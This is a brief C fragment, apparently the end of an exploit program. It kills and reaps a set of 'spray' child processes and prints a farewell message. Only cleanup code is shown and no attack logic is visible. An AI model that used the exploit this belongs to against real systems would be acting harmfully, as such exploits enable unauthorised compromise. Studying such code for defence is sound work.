    for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
    while (wait(NULL) > 0);
    printf("[*] Done. Goodbye.\n");
    printf("(・∀・)\n");
    return 0;
}
